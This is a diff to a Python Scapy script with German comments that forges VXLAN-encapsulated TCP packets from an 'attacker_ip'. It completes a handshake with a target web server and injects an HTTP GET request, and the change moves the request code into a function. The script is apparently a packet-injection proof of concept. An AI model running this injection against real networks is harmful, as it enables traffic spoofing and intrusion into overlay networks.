@@ -73,13 +73,25 @@ def syn_ack_do(packet):
     return
 
 
+getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
 
-
-
+#$$$$$ SEND TCP Package
 def send_tcp(src_port, seqnr, acknr, tcp_flags):
     ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
     out_ack = send(ack, verbose=0)
     return
+
+#$$$$$ SEND HTTP Request
+def syn_ack_received_send_http_req(src_port, seqnr, acknr):
+    http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
+    send(http_request, verbose=0)
+    if debug:
+        print("############## HTTP Request sent #####################")
+        print("srcport = " + str(syn_ack_dport)) 
+        print("ACK# = " + str(syn_ack_seq + 1))
+        print("SEQ# = " + str(syn_ack_ack))
+        print("")
+
 
 def worker(packet):
     payload_length = len(packet[TCP].payload)
@@ -112,6 +124,8 @@ def worker(packet):
         send_flags = 'A'
         print ("ACK wird geschickt mit ACK#=" + str(ack_nr) + " und SEQ#=" + str(seq_nr))
         send_tcp(dst_port, seq_nr, ack_nr, send_flags)
+        if (flags & (SYN ^ ACK)) == 18:
+            syn_ack_received_send_http_req(dst_port, seq_nr, ack_nr)
     if flags & FIN:
         send_flags = 'F''A'
         print ("FIN/ACK wird geschickt mit ACK#=" + str(ack_nr) + " und SEQ#=" + str(seq_nr))
@@ -267,17 +281,17 @@ class myThread (threading.Thread):
 
 ### HTTP GET Paket 
 # Hier wurd durch ein Argument des Skripts die Destination Address mitgtgeben. Accept-Encoding ist 8bit, damit nicht codiert wird.
-getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
+# getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
 
-#$$$$$ SEND HTTP Request
-http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr
-send(http_request, verbose=0)
-if debug:
-        print("############## HTTP Request sent #####################")
-        print("srcport = " + str(syn_ack_dport)) 
-        print("ACK# = " + str(syn_ack_seq + 1))
-        print("SEQ# = " + str(syn_ack_ack))
-        print("")
+# #$$$$$ SEND HTTP Request
+# http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr
+# send(http_request, verbose=0)
+# if debug:
+#         print("############## HTTP Request sent #####################")
+#         print("srcport = " + str(syn_ack_dport)) 
+#         print("ACK# = " + str(syn_ack_seq + 1))
+#         print("SEQ# = " + str(syn_ack_ack))
+#         print("")
 
 
 
